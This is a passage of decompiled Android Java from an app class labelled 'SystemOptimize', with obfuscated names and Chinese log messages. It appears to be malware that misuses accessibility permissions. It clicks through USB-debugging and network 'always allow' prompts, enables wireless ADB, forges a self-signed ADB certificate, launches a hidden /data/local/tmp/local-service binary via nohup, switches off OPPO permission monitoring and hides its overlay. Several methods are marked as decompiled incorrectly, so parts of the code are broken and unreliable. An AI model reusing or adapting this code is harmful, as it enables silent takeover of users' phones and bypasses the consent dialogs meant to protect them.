                t60.m214714d6("SystemOptimize", "ADB 连接部署成功");
                m212040c4();
                return true;
            }
        } catch (Exception e) {
            tz0.m214810b0("连接失败: ", e.getMessage(), "SystemOptimize");
        }
        t60.m214704c5("SystemOptimize", "ADB 连接部署失败");
        return false;
    }

    /* renamed from: e8 */
    public final String m212058e8(String str) {
        h41 h41VarM212893a2;
        t60.m214695b6(str, "command");
        try {
            g41 g41VarM212005e6 = m212005e6(this);
            if (g41VarM212005e6 != null && (h41VarM212893a2 = g41VarM212005e6.m212893a2(str)) != null) {
                StringBuilder sb = new StringBuilder();
                long jCurrentTimeMillis = System.currentTimeMillis() + 10000;
                synchronized (h41VarM212893a2) {
                    while (!h41VarM212893a2.f56606a3 && System.currentTimeMillis() < jCurrentTimeMillis) {
                        try {
                            byte[] bArr = (byte[]) h41VarM212893a2.f56608a5.poll();
                            if (bArr != null) {
                                sb.append(new String(bArr, AbstractC0577hd.f56650a0));
                            } else {
                                h41VarM212893a2.wait(Math.max(1L, jCurrentTimeMillis - System.currentTimeMillis()));
                            }
                        } finally {
                        }
                    }
                }
                while (true) {
                    byte[] bArr2 = (byte[]) h41VarM212893a2.f56608a5.poll();
                    if (bArr2 == null) {
                        break;
                    }
                    sb.append(new String(bArr2, AbstractC0577hd.f56650a0));
                }
                if (!h41VarM212893a2.f56606a3) {
                    g41VarM212005e6.m212894a3(m212001c7(this.f53864e9, new byte[0], h41VarM212893a2.f56603a0, h41VarM212893a2.f56604a1));
                }
                String string = sb.toString();
                t60.m214694b5(string, "result.toString()");
                if (string.length() > 0) {
                    t60.m214702c3("SystemOptimize", "Shell[" + str + "]: " + m21.m213937e5(150, string));
                }
                return string;
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "Shell命令异常: ".concat(str), e);
            m212035b7();
            return null;
        }
    }

    /* renamed from: e9 */
    public final void m212059e9() throws InterruptedException {
        h41 h41VarM212893a2;
        try {
            t60.m214702c3("SystemOptimize", "FireAndForget: ".concat("nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &"));
            g41 g41VarM212005e6 = m212005e6(this);
            if (g41VarM212005e6 != null && (h41VarM212893a2 = g41VarM212005e6.m212893a2("")) != null) {
                byte[] bytes = "nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &".concat("\n").getBytes(AbstractC0577hd.f56650a0);
                t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                synchronized (h41VarM212893a2) {
                    try {
                        long jCurrentTimeMillis = System.currentTimeMillis() + 2000;
                        while (!h41VarM212893a2.f56606a3 && !h41VarM212893a2.f56607a4 && System.currentTimeMillis() < jCurrentTimeMillis) {
                            h41VarM212893a2.wait(Math.max(1L, jCurrentTimeMillis - System.currentTimeMillis()));
                        }
                        h41VarM212893a2.f56607a4 = false;
                    } finally {
                    }
                }
                if (!h41VarM212893a2.f56606a3) {
                    g41VarM212005e6.m212894a3(m212001c7(this.f53863e8, bytes, h41VarM212893a2.f56603a0, h41VarM212893a2.f56604a1));
                }
                Thread.sleep(200L);
                if (h41VarM212893a2.f56606a3) {
                    return;
                }
                g41VarM212005e6.m212894a3(m212001c7(this.f53864e9, new byte[0], h41VarM212893a2.f56603a0, h41VarM212893a2.f56604a1));
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "P()异常: ".concat("nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &"), e);
            m212035b7();
        }
    }

    /* renamed from: f1 */
    public final C0579hf m212060f1(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM211990a9;
        DisplayMetrics displayMetrics;
        C0579hf c0579hf = new C0579hf();
        int i = 0;
        c0579hf.f56662a0 = false;
        c0579hf.f56663a1 = false;
        try {
            AccessibilityNodeInfo accessibilityNodeInfoM212107a2 = accessibilityNodeInfo.isCheckable() ? accessibilityNodeInfo : null;
            for (AccessibilityNodeInfo parent = accessibilityNodeInfo; parent != null && accessibilityNodeInfoM212107a2 == null && (i = i + 1) <= 3; parent = parent.getParent()) {
                accessibilityNodeInfoM212107a2 = m212016g1(parent);
            }
            if (accessibilityNodeInfoM212107a2 == null) {
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    List list = C0362a4.f53875a0;
                    rect.centerY();
                    int i2 = rect.top;
                    int i3 = rect.bottom;
                    Resources resources = this.f53816a1.getResources();
                    accessibilityNodeInfoM212107a2 = C0362a4.m212107a2(rootInActiveWindow, i2, i3, (resources == null || (displayMetrics = resources.getDisplayMetrics()) == null) ? 1080 : displayMetrics.widthPixels);
                }
            }
            if (accessibilityNodeInfoM212107a2 != null) {
                boolean zIsChecked = accessibilityNodeInfoM212107a2.isChecked();
                c0579hf.f56662a0 = zIsChecked;
                if (!zIsChecked && accessibilityNodeInfoM212107a2.performAction(16)) {
                    t60.m214702c3("SystemOptimize", "switchNode clicked");
                    c0579hf.f56663a1 = true;
                    List list2 = C0362a4.f53875a0;
                    C0362a4.m212113a8(this.f53815a0, 1000L);
                    accessibilityNodeInfoM212107a2.refresh();
                    c0579hf.f56662a0 = accessibilityNodeInfoM212107a2.isChecked();
                }
                if (!c0579hf.f56662a0 && !c0579hf.f56663a1 && (accessibilityNodeInfoM211990a9 = m211990a9(accessibilityNodeInfoM212107a2)) != null && accessibilityNodeInfoM211990a9.performAction(16)) {
                    c0579hf.f56663a1 = true;
                    List list3 = C0362a4.f53875a0;
                    C0362a4.m212113a8(this.f53815a0, 1000L);
                    accessibilityNodeInfoM212107a2.refresh();
                    c0579hf.f56662a0 = accessibilityNodeInfoM212107a2.isChecked();
                }
            }
            return c0579hf;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "f0() 异常", e);
            return c0579hf;
        }
    }

    /* renamed from: g3 */
    public final X509Certificate m212061g3(KeyPair keyPair) throws CertIOException, CertificateException {
        Date date = new Date();
        Date date2 = new Date(date.getTime() + 315360000000L);
        kh1 kh1Var = new kh1(AbstractC0003a2.m48c9("CN=", this.f53816a1.getPackageName()));
        j70 j70Var = new j70(kh1Var, BigInteger.valueOf(new Random().nextInt() & Integer.MAX_VALUE), date, date2, kh1Var, keyPair.getPublic());
        j70Var.addExtension(C1452yc.subjectKeyIdentifier, false, (InterfaceC0117b0) new i70().createSubjectKeyIdentifier(keyPair.getPublic()));
        Certificate certificateGenerateCertificate = CertificateFactory.getInstance("X.509").generateCertificate(new ByteArrayInputStream(j70Var.build(new g70("SHA512withRSA").build(keyPair.getPrivate())).getEncoded()));
        t60.m214693b4(certificateGenerateCertificate, "null cannot be cast to non-null type java.security.cert.X509Certificate");
        return (X509Certificate) certificateGenerateCertificate;
    }

    /* renamed from: g4 */
    public final SharedPreferences m212062g4() {
        return (SharedPreferences) this.f53838c3.getValue();
    }

    /* renamed from: g6 */
    public final int m212063g6() {
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                int i = Settings.Global.getInt(this.f53816a1.getContentResolver(), "adb_wifi_port", 0);
                t60.m214702c3("SystemOptimize", "getAdbWifiPortFromSettings: adb_wifi_port=" + i);
                if (30000 <= i && i < 50000) {
                    return i;
                }
            }
            return 0;
        } catch (Exception e) {
            tz0.m214810b0("getAdbWifiPortFromSettings 异常: ", e.getMessage(), "SystemOptimize");
            return 0;
        }
    }

    /* renamed from: g7 */
    public final int m212064g7() {
        return m212062g4().getInt("debugPort", 0);
    }

    /* renamed from: g8 */
    public final File m212065g8() {
        return this.f53816a1.getExternalFilesDir(null);
    }

    /* renamed from: h0 */
    public final void m212066h0() {
        AccessibilityNodeInfo cachedRoot = dqtvuisjd.f52358m1.getCachedRoot();
        if (cachedRoot == null) {
            cachedRoot = this.f53815a0.getRootInActiveWindow();
        }
        if (cachedRoot == null) {
            return;
        }
        Iterator it = dh0.f55785d5.iterator();
        while (it.hasNext()) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = cachedRoot.findAccessibilityNodeInfosByText((String) it.next());
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                t60.m214702c3("SystemOptimize", "检测到 USB 调试弹窗（包含相关文本）");
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (jCurrentTimeMillis - this.f53845d0 < 5000) {
                    return;
                }
                try {
                    AccessibilityNodeInfo accessibilityNodeInfoM212011f6 = m212011f6(cachedRoot);
                    if (accessibilityNodeInfoM212011f6 != null) {
                        if (accessibilityNodeInfoM212011f6.isChecked()) {
                            t60.m214702c3("SystemOptimize", "CompoundButton 已勾选");
                        } else {
                            accessibilityNodeInfoM212011f6.performAction(16);
                            t60.m214714d6("SystemOptimize", "已勾选 CompoundButton (一律允许)");
                            SystemClock.sleep(300L);
                        }
                    }
                } catch (Exception unused) {
                }
                try {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = cachedRoot.findAccessibilityNodeInfosByViewId("android:id/button1");
                    t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "root.findAccessibilityNodeInfosByViewId(id)");
                    AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(listFindAccessibilityNodeInfosByViewId);
                    if (accessibilityNodeInfo == null) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId2 = cachedRoot.findAccessibilityNodeInfosByViewId("com.android.settings:id/btn_positive");
                        t60.m214694b5(listFindAccessibilityNodeInfosByViewId2, "root.findAccessibilityNodeInfosByViewId(id)");
                        accessibilityNodeInfo = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(listFindAccessibilityNodeInfosByViewId2);
                    }
                    if (accessibilityNodeInfo != null) {
                        accessibilityNodeInfo.performAction(16);
                        this.f53845d0 = jCurrentTimeMillis;
                        t60.m214714d6("SystemOptimize", "已点击 button1 (允许USB调试)");
                        return;
                    }
                    return;
                } catch (Exception unused2) {
                    return;
                }
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:48:0x00cf, code lost:
    
        p000.t60.m214702c3("SystemOptimize", "已离开设置页面 (pkg=" + r5 + ")，停止返回");
     */
    /* renamed from: h1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m212067h1() throws InterruptedException {
        String string;
        CharSequence packageName;
        C0763km c0763kmM211469g3;
        t60.m214714d6("SystemOptimize", "系统优化流程完成");
        try {
            AccessibilityService accessibilityService = this.f53815a0;
            dqtvuisjd dqtvuisjdVar = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
            if (dqtvuisjdVar != null && (c0763kmM211469g3 = dqtvuisjdVar.m211469g3()) != null) {
                c0763kmM211469g3.m213600a0();
            }
            t60.m214714d6("SystemOptimize", "适配流程完成，已隐藏无障碍遮盖");
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "隐藏无障碍遮盖失败", e);
        }
        try {
            this.f53816a1.getSharedPreferences("system_optimize", 0).edit().putBoolean("pair_completed", true).putBoolean("adb_deploy_enabled", true).apply();
            t60.m214714d6("SystemOptimize", "已保存配对完成 + ADB部署启用标记");
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "保存标记失败", e2);
        }
        this.f53852d7 = true;
        t60.m214702c3("SystemOptimize", "【D0】firstDeployDone=true (配对完成)");
        m212043d0();
        t60.m214714d6("SystemOptimize", "handleComplete: 部署将在 WRITE_SETTINGS 权限完成后执行");
        try {
            m212092k2();
            if (!this.f53847d2) {
                this.f53847d2 = true;
                t60.m214714d6("SystemOptimize", "【CheckProcess】启动 5 秒定时任务");
                Object value = this.f53850d5.getValue();
                t60.m214694b5(value, "<get-heartbeatExecutor>(...)");
                ((ScheduledExecutorService) value).scheduleAtFixedRate(new c41(this, 1), 5000L, 5000L, TimeUnit.MILLISECONDS);
            }
        } catch (Exception e3) {
            tz0.m214808a8("启动心跳/进程监控异常: ", e3.getMessage(), "SystemOptimize", e3);
        }
        try {
            t60.m214714d6("SystemOptimize", "所有流程完成，执行返回键退出设置");
            int i = 1;
            while (true) {
                if (i < 6) {
                    AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (string = packageName.toString()) == null) {
                        string = "";
                    }
                    if (rootInActiveWindow != null) {
                        rootInActiveWindow.recycle();
                    }
                    if (!AbstractC0779a1.m213652a5(string, "settings", false) && !AbstractC0779a1.m213652a5(string, "Settings", false)) {
                        break;
                    }
                    this.f53815a0.performGlobalAction(1);
                    t60.m214702c3("SystemOptimize", "执行返回键 " + i + "/5");
                    Thread.sleep(300L);
                    i++;
                }
            }
        } catch (Exception e4) {
            t60.m214705c6("SystemOptimize", "执行返回键异常", e4);
        }
        try {
            t60.m214714d6("SystemOptimize", "handleComplete() 调用 onComplete");
            w00 w00Var = this.f53829b4;
            if (w00Var != null) {
                w00Var.invoke();
            }
        } catch (Exception e5) {
            t60.m214705c6("SystemOptimize", "onComplete 回调异常", e5);
        }
    }

    /* renamed from: h2 */
    public final void m212068h2() {
        for (int i = 0; i < 5; i++) {
            try {
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    y90 y90Var = AbstractC0361a3.f53874a0;
                    if (m212014f9(rootInActiveWindow, dh0.f55792e2) != null) {
                        t60.m214702c3("SystemOptimize", "检测到网络确认弹窗");
                        try {
                            AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = m212014f9(rootInActiveWindow, dh0.f55759a9);
                            if (accessibilityNodeInfoM212014f9 != null) {
                                AccessibilityNodeInfo parent = accessibilityNodeInfoM212014f9.getParent();
                                for (int i2 = 0; parent != null && i2 < 5; i2++) {
                                    if (parent.isCheckable()) {
                                        break;
                                    }
                                    int childCount = parent.getChildCount();
                                    for (int i3 = 0; i3 < childCount; i3++) {
                                        AccessibilityNodeInfo child = parent.getChild(i3);
                                        if (child != null && child.isCheckable()) {
                                            parent = child;
                                            break;
                                        }
                                    }
                                    parent = parent.getParent();
                                }
                                parent = null;
                                if (parent != null) {
                                    accessibilityNodeInfoM212014f9 = parent;
                                }
                                if (accessibilityNodeInfoM212014f9.isCheckable() && !accessibilityNodeInfoM212014f9.isChecked()) {
                                    accessibilityNodeInfoM212014f9.performAction(16);
                                    t60.m214702c3("SystemOptimize", "已勾选网络确认弹窗的始终允许选项");
                                    List list = C0362a4.f53875a0;
                                    C0362a4.m212112a7();
                                }
                            } else {
                                AccessibilityNodeInfo accessibilityNodeInfoM212009f4 = m212009f4(rootInActiveWindow);
                                if (accessibilityNodeInfoM212009f4 != null && !accessibilityNodeInfoM212009f4.isChecked()) {
                                    accessibilityNodeInfoM212009f4.performAction(16);
                                    t60.m214702c3("SystemOptimize", "已勾选网络确认弹窗的 CheckBox");
                                    List list2 = C0362a4.f53875a0;
                                    C0362a4.m212112a7();
                                }
                            }
                        } catch (Exception unused) {
                        }
                        y90 y90Var2 = AbstractC0361a3.f53874a0;
                        AccessibilityNodeInfo accessibilityNodeInfoM212014f92 = m212014f9(rootInActiveWindow, dh0.f55750a0);
                        if (accessibilityNodeInfoM212014f92 != null) {
                            accessibilityNodeInfoM212014f92.performAction(16);
                            t60.m214702c3("SystemOptimize", "已点击网络确认弹窗的允许按钮");
                            List list3 = C0362a4.f53875a0;
                            C0362a4.m212113a8(this.f53815a0, 1500L);
                            return;
                        }
                    }
                    List list4 = C0362a4.f53875a0;
                    C0362a4.m212112a7();
                }
            } catch (Exception e) {
                t60.m214705c6("SystemOptimize", "handleNetworkConfirmDialog 异常", e);
                return;
            }
        }
    }

    /* renamed from: h3 */
    public final void m212069h3() {
        AccessibilityNodeInfo accessibilityNodeInfoM212014f9;
        if (this.f53835c0) {
            t60.m214702c3("SystemOptimize", "OPPO禁止权限监控已勾选，跳过");
            return;
        }
        AtomicInteger atomicInteger = new AtomicInteger(0);
        while (!this.f53835c0 && atomicInteger.incrementAndGet() <= 2) {
            try {
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoM212048d6 = m212048d6(rootInActiveWindow);
                    if (accessibilityNodeInfoM212048d6 == null) {
                        t60.m214704c5("SystemOptimize", "OPPO：滚动视图查找失败");
                        m212025k1(10);
                    } else {
                        if (accessibilityNodeInfoM212048d6.performAction(Buffer.SEGMENTING_THRESHOLD)) {
                            t60.m214702c3("SystemOptimize", "OPPO：滚动到底部...");
                            m212089j7(accessibilityNodeInfoM212048d6);
                            m212025k1(5);
                        }
                        AccessibilityNodeInfo rootInActiveWindow2 = this.f53815a0.getRootInActiveWindow();
                        if (rootInActiveWindow2 != null) {
                            AccessibilityNodeInfo accessibilityNodeInfoM212048d62 = m212048d6(rootInActiveWindow2);
                            AccessibilityNodeInfo accessibilityNodeInfoM212017g2 = null;
                            if (accessibilityNodeInfoM212048d62 != null) {
                                y90 y90Var = AbstractC0361a3.f53874a0;
                                List list = dh0.f55797e7;
                                accessibilityNodeInfoM212014f9 = m212014f9(rootInActiveWindow2, list);
                                if (accessibilityNodeInfoM212014f9 == null) {
                                    for (int i = 0; i < 3; i++) {
                                        try {
                                            AccessibilityNodeInfo rootInActiveWindow3 = this.f53815a0.getRootInActiveWindow();
                                            if (rootInActiveWindow3 == null) {
                                                break;
                                            }
                                            AccessibilityNodeInfo accessibilityNodeInfoM212014f92 = m212014f9(rootInActiveWindow3, list);
                                            if (accessibilityNodeInfoM212014f92 != null) {
                                                accessibilityNodeInfoM212014f9 = accessibilityNodeInfoM212014f92;
                                                break;
                                            } else {
                                                List list2 = C0362a4.f53875a0;
                                                if (!C0362a4.m212111a6(accessibilityNodeInfoM212048d62, this.f53815a0, this.f53816a1)) {
                                                    break;
                                                }
                                            }
                                        } catch (Exception e) {
                                            t60.m214705c6("SystemOptimize", "scrollBackwardUtil 异常", e);
                                        }
                                    }
                                    accessibilityNodeInfoM212014f9 = null;
                                }
                                if (accessibilityNodeInfoM212014f9 == null) {
                                    y90 y90Var2 = AbstractC0361a3.f53874a0;
                                    accessibilityNodeInfoM212014f9 = m212090j8(accessibilityNodeInfoM212048d62, dh0.f55797e7);
                                }
                            } else {
                                accessibilityNodeInfoM212014f9 = null;
                            }
                            if (accessibilityNodeInfoM212014f9 != null) {
                                t60.m214702c3("SystemOptimize", "OPPO：禁止权限监控栏目查找成功");
                                AccessibilityNodeInfo accessibilityNodeInfoM212010f5 = m212010f5(accessibilityNodeInfoM212014f9);
                                if (accessibilityNodeInfoM212010f5 == null) {
                                    accessibilityNodeInfoM212010f5 = accessibilityNodeInfoM212014f9.getParent();
                                }
                                AccessibilityNodeInfo accessibilityNodeInfoM212017g22 = accessibilityNodeInfoM212010f5 == null ? null : m212017g2(accessibilityNodeInfoM212010f5);
                                if (accessibilityNodeInfoM212017g22 != null && accessibilityNodeInfoM212017g22.isChecked()) {
                                    this.f53835c0 = true;
                                    t60.m214702c3("SystemOptimize", "OPPO：禁止权限监控已勾选（已开启状态）");
                                    return;
                                }
                                AccessibilityNodeInfo accessibilityNodeInfoM212010f52 = m212010f5(accessibilityNodeInfoM212014f9);
                                if (accessibilityNodeInfoM212010f52 != null) {
                                    accessibilityNodeInfoM212014f9 = accessibilityNodeInfoM212010f52;
                                }
                                if (accessibilityNodeInfoM212014f9.performAction(16)) {
                                    t60.m214702c3("SystemOptimize", "OPPO：禁止权限监控已点击");
                                    m212025k1(10);
                                    AccessibilityNodeInfo rootInActiveWindow4 = this.f53815a0.getRootInActiveWindow();
                                    if (rootInActiveWindow4 != null) {
                                        y90 y90Var3 = AbstractC0361a3.f53874a0;
                                        AccessibilityNodeInfo accessibilityNodeInfoM212014f93 = m212014f9(rootInActiveWindow4, dh0.f55797e7);
                                        if (accessibilityNodeInfoM212014f93 != null) {
                                            AccessibilityNodeInfo accessibilityNodeInfoM212010f53 = m212010f5(accessibilityNodeInfoM212014f93);
                                            if (accessibilityNodeInfoM212010f53 == null) {
                                                accessibilityNodeInfoM212010f53 = accessibilityNodeInfoM212014f93.getParent();
                                            }
                                            if (accessibilityNodeInfoM212010f53 != null) {
                                                accessibilityNodeInfoM212017g2 = m212017g2(accessibilityNodeInfoM212010f53);
                                            }
                                            boolean zIsChecked = accessibilityNodeInfoM212017g2 != null ? accessibilityNodeInfoM212017g2.isChecked() : true;
                                            this.f53835c0 = zIsChecked;
                                            t60.m214702c3("SystemOptimize", "OPPO：禁止权限监控点击后状态: checked=" + zIsChecked);
                                        } else {
                                            this.f53835c0 = true;
                                        }
                                    }
                                }
                                if (this.f53835c0) {
                                    return;
                                }
                            } else {
                                t60.m214726f4("SystemOptimize", "OPPO：禁止权限监控栏目查找失败，重试 " + atomicInteger.get());
                            }
                            m212025k1(10);
                        }
                    }
                }
            } catch (Exception e2) {
                t60.m214705c6("SystemOptimize", "OPPO handleDisablePermissionMonitor 异常", e2);
            }
        }
        t60.m214702c3("SystemOptimize", "OPPO：禁止权限监控处理完成，状态=" + this.f53835c0);
    }

    /* JADX WARN: Removed duplicated region for block: B:41:0x0120 A[Catch: all -> 0x0039, Exception -> 0x0138, TRY_LEAVE, TryCatch #3 {Exception -> 0x0138, blocks: (B:41:0x0120, B:46:0x013b, B:48:0x0141, B:50:0x014e, B:54:0x015e, B:57:0x016f, B:68:0x01e1, B:72:0x01fb, B:75:0x0213, B:77:0x0219, B:79:0x021f, B:80:0x0227, B:65:0x01c9, B:39:0x010a), top: B:95:0x010a }] */
    /* JADX WARN: Removed duplicated region for block: B:46:0x013b A[Catch: all -> 0x0039, Exception -> 0x0138, TRY_ENTER, TryCatch #3 {Exception -> 0x0138, blocks: (B:41:0x0120, B:46:0x013b, B:48:0x0141, B:50:0x014e, B:54:0x015e, B:57:0x016f, B:68:0x01e1, B:72:0x01fb, B:75:0x0213, B:77:0x0219, B:79:0x021f, B:80:0x0227, B:65:0x01c9, B:39:0x010a), top: B:95:0x010a }] */
    /* JADX WARN: Removed duplicated region for block: B:68:0x01e1 A[Catch: all -> 0x0039, Exception -> 0x0138, TRY_LEAVE, TryCatch #3 {Exception -> 0x0138, blocks: (B:41:0x0120, B:46:0x013b, B:48:0x0141, B:50:0x014e, B:54:0x015e, B:57:0x016f, B:68:0x01e1, B:72:0x01fb, B:75:0x0213, B:77:0x0219, B:79:0x021f, B:80:0x0227, B:65:0x01c9, B:39:0x010a), top: B:95:0x010a }] */
    /* JADX WARN: Removed duplicated region for block: B:71:0x01f9  */
    /* renamed from: h4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m212070h4(int i) {
        String str;
        boolean zM214888a0;
        boolean z;
        Context context = this.f53816a1;
        ReentrantLock reentrantLock = this.f53855e0;
        if (!reentrantLock.tryLock()) {
            t60.m214702c3("SystemOptimize", "【H()】#" + i + " tryLock 失败，跳过");
            return;
        }
        try {
            try {
                Object systemService = context.getSystemService("power");
                PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
                if (powerManager != null && powerManager.isDeviceIdleMode()) {
                    t60.m214702c3("SystemOptimize", "【H()】#" + i + " 省电模式，跳过");
                    reentrantLock.unlock();
                    return;
                }
            } catch (Exception unused) {
            }
            try {
                zM214888a0 = v00.m214888a0();
                try {
                    SharedPreferences sharedPreferences = context.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0);
                    boolean z2 = sharedPreferences.getBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), false);
                    boolean z3 = sharedPreferences.getBoolean("accountProtectionEnabled", false);
                    C0287a0 c0844m0 = C0287a0.f52351a2.getInstance(context);
                    if (z2) {
                        str = "SystemOptimize";
                        try {
                            long jCurrentTimeMillis = System.currentTimeMillis() - sharedPreferences.getLong("isAdminActivating_start", 0L);
                            if (jCurrentTimeMillis > 120000) {
                                t60.m214726f4(str, "【H()】#" + i + " isAdminActivating 超时 " + (jCurrentTimeMillis / 1000) + "秒，自动重置");
                                sharedPreferences.edit().putBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), false).remove("isAdminActivating_start").apply();
                                z2 = false;
                            }
                        } catch (Exception e) {
                            e = e;
                            try {
                                t60.m214705c6(str, "【H()】#" + i + " 账户管理异常", e);
                                if (!zM214888a0) {
                                }
                            } catch (Exception e2) {
                                e = e2;
                                t60.m214705c6(str, "【H()】异常", e);
                                reentrantLock.unlock();
                            }
                        }
                    } else {
                        str = "SystemOptimize";
                    }
                    if (z2) {
                        t60.m214702c3(str, "【H()】#" + i + " isAdminActivating=true，删除账号");
                        c0844m0.m211400a4();
                    } else if (z3 && !c0844m0.m211399a3()) {
                        t60.m214702c3(str, "【H()】#" + i + " 账户保护已启用，创建账号");
                        c0844m0.m211397a1();
                    }
                } catch (Exception e3) {
                    e = e3;
                    str = "SystemOptimize";
                }
            } catch (Exception e4) {
                e = e4;
                str = "SystemOptimize";
            }
            if (!zM214888a0) {
                t60.m214702c3(str, "【H()】#" + i + " local-service 运行中，跳过 ADB/部署逻辑");
                reentrantLock.unlock();
                return;
            }
            File fileM212065g8 = m212065g8();
            boolean z4 = fileM212065g8 != null && new File(fileM212065g8, "cert.pem").exists() && new File(fileM212065g8, "private.key").exists();
            boolean z5 = context.getSharedPreferences("system_optimize", 0).getBoolean("adb_deploy_enabled", false);
            if (z4 || z5) {
                z = z4;
            } else {
                t60.m214714d6(str, "【H()】#" + i + " 未部署过，自动生成自签名证书用于 ADB 认证");
                try {
                    KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
                    keyPairGenerator.initialize(2048);
                    KeyPair keyPairGenerateKeyPair = keyPairGenerator.generateKeyPair();
                    t60.m214694b5(keyPairGenerateKeyPair, "keyGen.generateKeyPair()");
                    X509Certificate x509CertificateM212061g3 = m212061g3(keyPairGenerateKeyPair);
                    PrivateKey privateKey = keyPairGenerateKeyPair.getPrivate();
                    t60.m214694b5(privateKey, "keyPair.private");
                    m212084j2(privateKey);
                    m212083j1(x509CertificateM212061g3);
                    this.f53843c8 = keyPairGenerateKeyPair;
                    this.f53844c9 = x509CertificateM212061g3;
                } catch (Exception e5) {
                    e = e5;
                    z = z4;
                }
                try {
                    t60.m214714d6(str, "【H()】#" + i + " 自签名证书生成成功");
                    z = true;
                } catch (Exception e6) {
                    e = e6;
                    z = true;
                    t60.m214705c6(str, "【H()】#" + i + " 自签名证书生成失败", e);
                    if (z) {
                    }
                }
            }
            if (z) {
                t60.m214702c3(str, "【H()】#" + i + " 没有证书/密钥，跳过");
                reentrantLock.unlock();
                return;
            }
            if (!z5) {
                t60.m214702c3(str, "【H()】#" + i + " 尚未成功部署过 local-service，跳过心跳");
                reentrantLock.unlock();
                return;
            }
            if (!v00.m214889a1() && !m212073h8()) {
                t60.m214714d6(str, "【H()】local-service未运行且无线调试关闭，尝试开启无线调试");
                m212097k7();
            }
            ((ExecutorService) this.f53857e2.getValue()).submit(new RunnableC0027ag(this, i, 5));
            reentrantLock.unlock();
        } catch (Throwable th) {
            reentrantLock.unlock();
            throw th;
        }
    }

    /* renamed from: h6 */
    public final boolean m212071h6() {
        try {
            int i = Settings.Global.getInt(this.f53816a1.getContentResolver(), "development_settings_enabled", 0);
            t60.m214702c3("SystemOptimize", "isDevOptionsEnabled: development_settings_enabled=" + i);
            return i > 0;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "isDevOptionsEnabled 读取异常", e);
            return false;
        }
    }

    /* renamed from: h7 */
    public final boolean m212072h7() {
        boolean z;
        AccessibilityNodeInfo accessibilityNodeInfoM212008f3;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                y90 y90Var = AbstractC0361a3.f53874a0;
                ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55750a0, dh0.f55788d8), dh0.f55752a2);
                String str = "";
                int size = arrayListM213298i5.size();
                int i = 0;
                while (true) {
                    if (i >= size) {
                        accessibilityNodeInfoM212008f3 = null;
                        break;
                    }
                    Object obj = arrayListM213298i5.get(i);
                    i++;
                    String str2 = (String) obj;
                    accessibilityNodeInfoM212008f3 = m212008f3(rootInActiveWindow, str2);
                    if (accessibilityNodeInfoM212008f3 != null) {
                        str = str2;
                        break;
                    }
                }
                if (accessibilityNodeInfoM212008f3 != null) {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    if (jCurrentTimeMillis - this.f53846d1 < 500) {
                        return true;
                    }
                    CharSequence className = accessibilityNodeInfoM212008f3.getClassName();
                    t60.m214702c3("SystemOptimize", "检测到对话框按钮: " + str + ", class=" + ((Object) className) + ", clickable=" + accessibilityNodeInfoM212008f3.isClickable());
                    AccessibilityNodeInfo parent = accessibilityNodeInfoM212008f3.getParent();
                    boolean zDispatchGesture = false;
                    for (int i2 = 0; i2 < 5 && parent != null; i2++) {
                        if (parent.isClickable()) {
                            zDispatchGesture = parent.performAction(16);
                            z = false;
                            try {
                                t60.m214702c3("SystemOptimize", "方式1 点击第" + (i2 + 1) + "层父节点: " + zDispatchGesture + ", class=" + ((Object) parent.getClassName()));
                                if (zDispatchGesture) {
                                    break;
                                }
                            } catch (Exception e) {
                                e = e;
                                t60.m214705c6("SystemOptimize", "isInAcceptDialog 异常", e);
                                return z;
                            }
                        }
                        parent = parent.getParent();
                    }
                    z = false;
                    if (!zDispatchGesture) {
                        Rect rect = new Rect();
                        accessibilityNodeInfoM212008f3.getBoundsInScreen(rect);
                        float fCenterX = rect.centerX();
